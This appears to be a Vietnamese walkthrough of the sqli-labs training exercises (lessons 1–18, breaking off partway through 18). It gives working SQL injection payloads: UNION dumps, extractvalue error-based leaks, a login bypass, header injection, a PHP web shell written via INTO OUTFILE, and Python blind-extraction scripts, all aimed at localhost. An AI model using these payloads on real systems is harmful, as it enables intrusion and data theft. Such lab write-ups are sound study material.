# sqli-labs

Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)

- [Less-1](#Less-1)

- [Less-2](#Less-2)

- [Less-3](#Less-3)

- [Less-4](#Less-4)

- [Less-5](#Less-5)

- [Less-6](#Less-6)

- [Less-7](#Less-7)

- [Less-8](#Less-8)

- [Less-9](#Less-9)

- [Less-10](#Less-10)

- [Less-11](#Less-11)

- [Less-12](#Less-12)

- [Less-13](#Less-13)

- [Less-14](#Less-14)

- [Less-15](#Less-15)

- [Less-16](#Less-16)

- [Less-17](#Less-17)

- [Less-18](#Less-18)

- [Less-19](#Less-19)

- [Less-20](#Less-20)

- [Less-21](#Less-21)

- [Less-22](#Less-22)

## Less-1

Câu query:

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

Dựa vào câu query, ta có thể search user thông qua id, vd: `?id=1`, kết quả trả về user tương ứng với `id`.

```html
<font size='5' color= '#99FF00'>Your Login name:Dumb<br>Your Password:Dumb</font>
```

Để bypass câu query trên, ta chèn dấu `'` để escape chuỗi nhập vào trong đoạn `id='$id'`, vd: `?id=0'`. 

```html
<font color= "#FFFF00">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0'' LIMIT 0,1' at line 1</font>
```

Sau đó, dùng `UNION` để kết hợp câu query của đề bài , ở đây chúng ta dùng `SELECT 1,2,3,4--+` để tìm ra số cột tương ứng.

Payload: `?id=0%27%20union%20select%201,2,3--+` 

```html
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:3</font>
```

Số cột lúc này là 3, từ đó ta có thể chèn các câu query để lấy tên của `dbs`,`tables`,`columns` cũng như là `data` có trong `dbs`.

Vd: (Get dbs) Payload: `?id=%27+UNION+(SELECT+1,2,GROUP_CONCAT(+SCHEMA_NAME+)+FROM+INFORMATION_SCHEMA.SCHEMATA)--+`

```html
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:information_schema,challenges,mysql,performance_schema,security</font>
```

(Get tables trong db security) Payload: `?id=%27+UNION+(SELECT+1,2,GROUP_CONCAT(+TABLE_NAME+)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA="security")--+`

```html
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:emails,referers,uagents,users</font>
```

## Less-2

Câu query:

```php
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

Tương tự như `Less-1`, thì `id=$id` thay vì `id='$id'` như `Less-1`.

Để bypass câu này, ta cũng làm như `Less-1`, nhưng ta không cần escape dấu `'` và mà ta lồng câu query với câu `SELECT` bằng `UNION`.

Vì dbs giống câu trên nên ta đã biết số cột tương ứng là 3.

Payload: `?id=0+UNION+(SELECT+1,2,GROUP_CONCAT(+schema_name+)+FROM+INFORMATION_SCHEMA.SCHEMATA)--+`

Tuy nhiên, chúng ta phải chèn `0` vào trước `UNION`, vì nếu truyền các số như `1`,`2`,`3`.. thì server sẽ in ra kết quả thực thi của câu query đề bài chứ không phải câu query chúng ta chèn vào.

```html
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:information_schema,challenges,mysql,performance_schema,security</font>
```

Và để leak hết data trong dbs, ta làm tương tự câu `Less-1`

## Less-3

Câu query:

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

Lần này `id=('$id')`, thì khi ta nhập `0` vào param `id` thì kết quả không in lỗi nữa. Vậy để bypass câu query trên trước tiên ta phải escape ra khỏi chuỗi `'$id'` sau đó dùng `)` để escape tiếp `()` sau đó chèn câu query của chúng ta vào và sử dụng `--` để comment các câu query ở phía sau như 2 câu trước.

Payload: `?id=0')+UNION+(SELECT+1,2,GROUP_CONCAT(+schema_name+)+FROM+INFORMATION_SCHEMA.SCHEMATA)--+`

```html
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:information_schema,challenges,mysql,performance_schema,security</font>
```

Và để leak hết data trong dbs, ta làm tương tự câu `Less-1`.

## Less-4

Câu query:

```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

Ở câu này, đề bài đã "nhét" `id` mà ta nhập vào trong `""`, nên để bypass được thì ta chỉ cần escape ra ngoài dấu `"` sau đó chèn `)` như câu `Less-3`.

Payload: `?id=0")+UNION+(SELECT+1,2,GROUP_CONCAT(+schema_name+)+FROM+INFORMATION_SCHEMA.SCHEMATA)--+`

```html
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:information_schema,challenges,mysql,performance_schema,security</font>
```

Và để leak hết data trong dbs, ta làm tương tự câu `Less-1`

## Less-5

Ở câu này, khác với 4 câu trên, server nó sẽ không in ra kết quả chính xác, mà chỉ in ra `You are in...........` nếu như câu query hợp lệ hoặc in ra lỗi.

```php
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else
	{

	echo '<font size="3" color="#FFFF00">';
	print_r(mysql_error());
	echo "</br></font>";
	echo '<font color= "#0000ff" font size= 3>';

	}```
```

__Idea__ 

Nếu ta exploit theo hướng câu query hợp lệ hay nói cách khác là làm sao cho nó in ra dòng `You are in...........` thì mất khá nhiều thời gian. Nên ta làm hướng còn lại là lợi dụng kết ra in ra lỗi sau đó tìm hướng đi đúng nhất. Sau khi google khá lâu thì tìm được một [site](http://securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html) nói về `Error Based Injection` khá hay. Mấu chốt ở đây là chèn [XPATH](https://owasp.org/www-community/attacks/XPATH_Injection#:~:text=Similar%20to%20SQL%20Injection%2C%20XPath,XPath%20query%20for%20XML%20data.&text=They%20may%20even%20be%20able,an%20XML%20based%20user%20file) query để trigger bung ra `data` thông qua lỗi. Nhưng cũng không hẳn là chèn `XPATH`, mà ta chỉ sử dụng một trong những `function` của `XPATH` trong trường hợp này là `Extractvalue()`.

Payload: `?id=1'+and+extractvalue(0x0a,concat(0x0a,(select+database())))--+`

Kết quả là in ra `database` là `security`.

```html
<font size="3" color="#FFFF00">XPATH syntax error: 'security'</br></font>
```

Lấy được tên `database` rồi thì leak các `database`, `tables`, `columns` khác cũng tương tự...

Payload: `?id=1'+and+extractvalue(0x0a,concat(0x0a,(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+0,1)))--+`

```html
<font size="3" color="#FFFF00">XPATH syntax error: 'information_schema'</br></font>
```

## Less-6

Câu query:

```php
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

Ở câu này là sự kết hợp của câu 4 và 5. Để bypass chỉ cần escape `$id` ra khỏi `""` và chèn query thông qua `XPATH` như câu 5.

Payload: `0"+and+extractvalue(0x0a,concat(0x0a,(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+2,1)))--+`

```html
<font size="3"  color= "#FFFF00">XPATH syntax error: 'mysql'</br></font>
```

## Less-7

```php
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font color= "#FFFF00">';	
  	echo 'You are in.... Use outfile......';
  	echo "<br>";
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	echo 'You have an error in your SQL syntax';
	//print_r(mysql_error());
	echo "</font>";  
	}
```

Đọc code thì tương tự các câu trên, nhưng câu này đề bài muốn chúng ta sử dụng `outfile`, mà cụ thể là `into outfile`. Như các câu trước, escape câu query của đề bài sau đó chèn `text` hoặc chèn `code` `php` vào file.

Payload: `1'))+UNION+SELECT+1,"<?php echo system($_GET['cmd']);?>",3+into+outfile+"/var/www/html/shell.php"--+`

## Less-8

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	//echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
```

Đọc code ở bài này, thì lần này kết quả sẽ không được in nếu câu query lỗi, tức là chúng ta không ta không thể dựa vào `XPATH` như các câu trước, và khi câu query khi đúng sẽ in ra `You are in...........`. Dạng này gọi là `Blind -Boolean Based - Single Quotes`, tức là ta chỉ có thể biết câu query đó là `True` hoặc `False`. 

__Idea__

Ý tưởng của bài này là dựa vào kết quả trả về là `True` hoặc `False` để đoán `database`,`table`, `column`... Sử dụng `AND` và `substr()`, `ascii()` hoặc `left()`, cũng có thể sử dụng `right()`.

Ở đây mình sử dụng `left()` để đoán `database`. Payload ở đây sẽ là:

`?id=1'+and+left((select+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+0,1),1)='a'--+` 

Nếu kết quả trả về là `True`, thì tức là kí tự đầu tiên của database thứ nhất là `a`. Và kết quả là `False`. Ta tiếp tục thử với các kí tự còn lại trong bảng chữ cái.

`?id=1'+and+left((select+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+0,1),1)='i'--+`

```html
<font size="5" color="#FFFF00">You are in...........<br></font>
```

Kết quả trả về `True` ở kí tự `i`, ta tiếp tục với các kí tự thứ 2,3... và tăng `length` trong `payload` lên.

`?id=1'+and+left((select+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+0,1),2)='in'--+`

Kết quả trả về `True` ở kí tự thứ 2 là `n`, vậy ta tiếp tục cho tới khi tìm được tên hoàn chỉnh, sau đó thay đổi `limit 0,1` lên 1,2,3,4 để tìm tên `database` khác. Nhưng để tìm ra `length` chính xác thì mình sử dụng `length()`

`?id=1'+and+length((select+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+0,1))=10--+` 

Ở đây nếu kết quả trả về `True` thì `length` của database đầu tiên là 10, nếu không thì ta sẽ thử các số cho đến khi kết quả trả về `True`.

`?id=1'+and+length((select+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+0,1))=18--+`

```html
<font size="5" color="#FFFF00">You are in...........<br></font>
```

Kết quả `True` ở 18, vậy `database` đầu tiên có `length` là 18. Sau đó thay đổi `limit` để tìm `length` các `database` khác.

Nếu ta làm tay thì khá là mất thời gian, vì vậy mình có viết 1 [script](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-8.py) nhỏ, code hơi chuối :joy: :joy: 

```python
import requests
import string

def get_length_dbs(url, comment):
    for i in range(20,4,-1):
        r = requests.get(url + str(i) + comment).text
        # print(url + str(i) + comment)
        if 'You are in' in r:
            return i

def send(url):
    r = requests.get(url).text
    if 'You are in' in r:
        return True
    else:
        return False

# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
alphabet = string.ascii_lowercase + '_'
url = "http://localhost/Less-8/?id=1' and "
payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload_length_2 = ",1))="
payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload2 = ",1),"
payload3 = ")='"
comment = '--+'
count = 1
dbs = ""
#length = (get_length_dbs("http://localhost/Less-8/?id=1'+and+length(database())=",'--+'))

for i in range(0,5):
    length = get_length_dbs(url + payload_length_1 + str(i) + payload_length_2,comment)
    for j in range(length):
        for c in alphabet:
            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
            # print(final_url)
            if send(final_url):
                count += 1
                dbs += c
                # print(dbs)
    print("[+] Found: Database {}. {}".format(i+1,dbs))
    dbs = ""
    count = 1

```

## Less-9 

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
```

Ở câu này cũng tương tự câu 8, nhưng dù kết quả có là `True` hay `False` thì kết quả sẽ là `You are in...........`. Sau 1 hồi thử thì mình thấy sự khác biệt ở `Content-Length` trong kết quả `Response`.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-9_1.png?raw=true)

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-9_2.png?raw=true)

Nhìn lại thì thấy dòng này.

```html
<font color= "#0000ff" font size= 3>
```

Cụ thể là khi câu query lỗi thì xuất hiện dòng trên, vậy mình chỉ cần xét `Content-Length` để biết được kết quả là `True` hay `False` hoặc xét có dòng `<font color= "#0000ff" font size= 3>` khi kết quả trả về `False`.

Nên mình chỉ cần sửa [script](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-9.py) ở câu 8 lại một chút là code chạy được. ¯\\\_(ツ)\_/¯ 

```python
import requests
import string

def get_length_dbs(url, comment):
    for i in range(20,4,-1):
        r = requests.get(url + str(i) + comment).text
        # print(url + str(i) + comment)
        if '#0000ff' not in r:
            return i

def send(url):
    r = requests.get(url).text
    if '#0000ff' not in r:
        return True
    else:
        return False

# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
alphabet = string.ascii_lowercase + '_'
url = "http://localhost/Less-9/?id=1' and "
#payload = "left((select database()),"
payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload_length_2 = ",1))="
payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload2 = ",1),"
payload3 = ")='"
comment = '--+'
count = 1
dbs = ""

for i in range(0,5):
    length = get_length_dbs(url + payload_length_1 + str(i) + payload_length_2,comment)
    for j in range(length):
        for c in alphabet:
            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
            # print(final_url)
            if send(final_url):
                count += 1
                dbs += c
                # print(dbs)
    print("[+] Found: Database {}. {}".format(i+1,dbs))
    dbs = ""
    count = 1
```

## Less-10

```php
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
```

Ở câu này, về cơ bản không khác gì nhiều so với câu trước, ta có thể lấy [script](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-10.py) của câu trước để solve câu này, chỉ cần thay đổi một chút ở `URL`.

```python
import requests
import string

def get_length_dbs(url, comment):
    for i in range(20,4,-1):
        r = requests.get(url + str(i) + comment).text
        # print(url + str(i) + comment)
        if '#0000ff' not in r:
            return i

def send(url):
    r = requests.get(url).text
    if '#0000ff' not in r:
        return True
    else:
        return False

# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
alphabet = string.ascii_lowercase + '_'
url = 'http://localhost/Less-10/?id=1" and '
#payload = "left((select database()),"
payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload_length_2 = ",1))="
payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload2 = ",1),"
payload3 = ")='"
comment = '--+'
count = 1
dbs = ""

for i in range(0,5):
    length = get_length_dbs(url + payload_length_1 + str(i) + payload_length_2,comment)
    for j in range(length):
        for c in alphabet:
            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
            # print(final_url)
            if send(final_url):
                count += 1
                dbs += c
                # print(dbs)
    print("[+] Found: Database {}. {}".format(i+1,dbs))
    dbs = ""
    count = 1
```

## Less-11

```php
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";

```

Sau 10 bài sử dụng `GET` method, thì ở câu này là `POST`. Thử vài payload escape chuỗi.

`uname=asdf'&passwd=asdf&submit=Submit`

Kết quả:

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'asdf' LIMIT 0,1' at line 1`

Khi gán `admin'--+` để biến câu query lúc này `username='admin'--+` .Sử dụng comment  `--+` hoặc `#` để loại bỏ vế phía sau.

Payload lúc này sẽ là: `uname=admin'--+&passwd=1&submit=Submit`

Với payload như trên thì câu query lúc này sẽ là:

```
SELECT username, password FROM users WHERE username='admin'--+
```

Kết quả:

```html
<font size="3" color="#0000ff"><br>Your Login name:admin<br>Your Password:admin<br></font>
```

Và để leak tất cả database...

`uname='+union+SELECT+1,GROUP_CONCAT(+SCHEMA_NAME+)+FROM+INFORMATION_SCHEMA.SCHEMATA--+&passwd=&submit=Submit`

```html
<font size="3" color="#0000ff"><br>Your Login name:1<br>Your Password:information_schema,challenges,mysql,performance_schema,security<br></font>
```

## Less-12

```php
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"'; 
@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

`uname` lúc này nằm trong `""`  và `username=($uname)` nên chỉ cần escape ra và giải như câu 11.

`uname=admin")--+&passwd=1&submit=Submit`

Kết quả:

```html
<font size="3" color="#0000ff"><br>Your Login name:admin<br>Your Password:admin<br></font>
```

## Less-13

```php
@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		//echo 'Your Login name:'. $row['username'];
		//echo "<br>";
		//echo 'Your Password:' .$row['password'];
		//echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"   />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysql_error());
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg"   />';	
		echo "</font>";  
	}
```

Đọc code thì thấy khi cây query lỗi thì in lỗi, còn câu query mà đúng thì nó không in gì cả. Lúc này mình lại sử dụng  [XPATH](https://owasp.org/www-community/attacks/XPATH_Injection#:~:text=Similar%20to%20SQL%20Injection%2C%20XPath,XPath%20query%20for%20XML%20data.&text=They%20may%20even%20be%20able,an%20XML%20based%20user%20file) như câu 5.

Escape `uname` ra khỏi `username=('$uname')` rồi sử dụng `Extractvalue()` để trigger.

`uname=1')+and+extractvalue(0x0a,concat(0x0a,(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+4,1)))--+&passwd=1&submit=Submit` 

```html
<font color= "#0000ff" font size="3">XPATH syntax error: '
security'</br></br></br><img src="../images/slap.jpg"   /></font>
```

Leak tất cả `table` trong `security database` 

`uname=1')+and+extractvalue(0x0a,concat(0x0a,(SELECT+GROUP_CONCAT(+TABLE_NAME+)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA="security")))--+&passwd=1&submit=Submit`

```html
<font color= "#0000ff" font size="3">XPATH syntax error: '
emails,referers,uagents,users'</br></br></br><img src="../images/slap.jpg"   /></font>
```

## Less-14

```php
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"'; 
@$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
```

Câu này tương tự câu 13.

Leak tên `column` từ table `user` 

`uname=1"+and+extractvalue(0x0a,concat(0x0a,(SELECT+GROUP_CONCAT(+COLUMN_NAME+)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME="users")))--+&passwd=1&submit=Submit`

```html
<font color= "#0000ff" font size="3">XPATH syntax error: '
id,username,password'</br></br></br><img src="../images/slap.jpg"  /></font>
```

## Less-15

```php
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

Câu này thuộc dạng `Blind - Boolean Based - Single quotes`  cũng tương tự câu 8, nên chỉ cần sửa script lại một số chỗ là có thể solve được. :joy: :joy:

Kết quả là `True` thì `Response` `<img src="../images/flag.jpg"  />`

Còn kết quả là `False` thì `Response` `<img src="../images/slap.jpg"  />`

[Script](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-15.py)

```python
import requests
import string

def get_length_dbs(url, data, comment):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in range(20,4,-1):
        r = requests.post(url,data = data + str(i) + comment,headers=headers).text
        # print(url + str(i) + comment)
        if 'images/flag.jpg' in r:
            return i

def send(url,data):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post(url,data=data,headers=headers).text
    if 'images/flag.jpg' in r:
        return True
    else:
        return False

# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
alphabet = string.ascii_lowercase + '_'
url = "http://localhost/Less-15/"
data = "passwd=1&submit=Submit&uname=1' or  "
#payload = "left((select database()),"
payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload_length_2 = ",1))="
payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload2 = ",1),"
payload3 = ")='"
comment = '--+'
count = 1
dbs = ""

for i in range(0,5):
    length = get_length_dbs(url, data + payload_length_1 + str(i) + payload_length_2,comment)
    for j in range(length):
        for c in alphabet:
            final_url = data + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
            # print(final_url)
            if send(url, final_url):
                count += 1
                dbs += c
                # print(dbs)
    print("[+] Found: Database {}. {}".format(i+1,dbs))
    dbs = ""
    count = 1
```

## Less-16

```php
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"'; 
@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

Câu này cách giải tương tự câu 15, thay vì `Single quotes` như câu 15 thì ở câu này là `Double quotes`.

[Script](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-16.py)

```python
import requests
import string

def get_length_dbs(url, data, comment):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in range(20,4,-1):
        r = requests.post(url,data = data + str(i) + comment,headers=headers).text
        # print(url + str(i) + comment)
        if 'images/flag.jpg' in r:
            return i

def send(url,data):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post(url,data=data,headers=headers).text
    if 'images/flag.jpg' in r:
        return True
    else:
        return False

# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
alphabet = string.ascii_lowercase + '_'
url = "http://localhost/Less-16/"
data = 'passwd=1&submit=Submit&uname=") or  '
#payload = "left((select database()),"
payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload_length_2 = ",1))="
payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
payload2 = ",1),"
payload3 = ")='"
comment = '--+'
count = 1
dbs = ""

for i in range(0,5):
    length = get_length_dbs(url, data + payload_length_1 + str(i) + payload_length_2,comment)
    for j in range(length):
        for c in alphabet:
            final_url = data + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
            # print(final_url)
            if send(url, final_url):
                count += 1
                dbs += c
                # print(dbs)
    print("[+] Found: Database {}. {}".format(i+1,dbs))
    dbs = ""
    count = 1
```

## Less-17

Ở câu này `uname` đã được filter input thông qua hàm `check_input()`. Vì thế khó mà bypass được tại `uname`

```php
function check_input($value)
	{
	if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,15);
		}

		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc())
			{
			$value = stripslashes($value);
			}

		// Quote if not a number
		if (!ctype_digit($value))
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
		
	else
		{
		$value = intval($value);
		}
	return $value;
	}
```

```php
$uname=check_input($_POST['uname']);  

$passwd=$_POST['passwd'];

```

Nhưng đề chỉ check input ở `uname`, còn `passwd` thì không.

```php
@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";

$result=mysql_query($sql);
$row = mysql_fetch_array($result);
//echo $row;
	if($row)
	{
  		//echo '<font color= "#0000ff">';	
		$row1 = $row['username'];  	
		//echo 'Your Login name:'. $row1;
		$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
		mysql_query($update);
  		echo "<br>";
	
	
	
		if (mysql_error())
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			print_r(mysql_error());
			echo "</br></br>";
			echo "</font>";
		}
		else
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			//echo " You password has been successfully updated " ;		
			echo "<br>";
			echo "</font>";
		}
	
		echo '<img src="../images/flag1.jpg"   />';	
		//echo 'Your Password:' .$row['password'];
  		echo "</font>";
	


  	}
	else  
	{
		echo '<font size="4.5" color="#FFFF00">';
		//echo "Bug off you Silly Dumb hacker";
		echo "</br>";
		echo '<img src="../images/slap1.jpg"   />';
	
		echo "</font>";  
	}
```

Đọc sơ qua code, thì `mysql_error()` sẽ được in ra nếu câu query của bạn lỗi và ngược lại ta sẽ không thu được gì. Mà khi gặp trường hợp này, thì mình luôn thử `XPATH`, cụ thể là `Extractvalue()` trước tiên :joy: :joy:

`passwd='+and+extractvalue(0x0a,concat(0x0a,(select+database())))--+&uname=admin&submit=Submit`

It works

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-17-1.png?raw=true)

Và leak `table`, `database` như các câu trước.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-17-2.png?raw=true)

## Less-18

```php
$uname = check_input($_POST['uname']);
$passwd = check_input($_POST['passwd']
```

Ở bài này, `uname` và `passwd` đều bị filter trong `check_input()`.

```php
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
$result1 = mysql_query($sql);
$row1 = mysql_fetch_array($result1);
		if($row1)
			{
			echo '<font color= "#FFFF00" font size = 3 >';
			$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
			mysql_query($insert);
			//echo 'Your IP ADDRESS is: ' .$IP;
			echo "</font>";
			//echo "<br>";
			echo '<font color= "#0000ff" font size = 3 >';			
			echo 'Your User Agent is: ' .$uagent;
			echo "</font>";
			echo "<br>";
			print_r(mysql_error());			
			echo "<br><br>";
			echo '<img src="../images/flag.jpg"  />';
			echo "<br>";
			
			}
		else
			{
			echo '<font color= "#0000ff" font size="3">';
			//echo "Try again looser";
			print_r(mysql_error());
			echo "</br>";			
			echo "</br>";
			echo '<img src="../images/slap.jpg"   />';	
			echo "</font>";  
			}

	}
```

Thử đăng nhập với với username là `admin`.

`uname=admin&passwd=0&submit=Submit`

Kết quả trả về `User Agent`.

```html
<font color= "#0000ff" font size = 3 >Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</font>
```

Vậy câu hỏi đặt ra ở đây là nếu mình thay đổi `User Agent` thì kết quả trả về ntn?

```
POST /Less-18/ HTTP/1.1
Host: localhost
Content-Length: 34
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: ANYTHING
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Less-18/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

uname=admin&passwd=0&submit=Submit
```

Và kết quả trả về đúng như những gì mà mình nhập.

```html
<font color= "#0000ff" font size = 3 >Your User Agent is: ANYTHING</font>
```

Nhìn lên title của bài này là `POST - Header Injection - Uagent field - Error based` thì mình thử chèn câu query vào `User-Agent` xem sao.

`User-Agent: '`

```html
<font color= "#0000ff" font size = 3 >Your User Agent is: '</font><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '172.17.0.1', 'admin')' at line 1<br><br><img src="../images/flag.jpg"  /><br>
```

`Response` trả về kèm theo lỗi nên ta tiếp tục sử dụng `extractvalue()` thần thánh :joy:

`User-Agent: ' and extractvalue(0x0a,concat(0x0a,(select database()))),'`

Boom.

```html
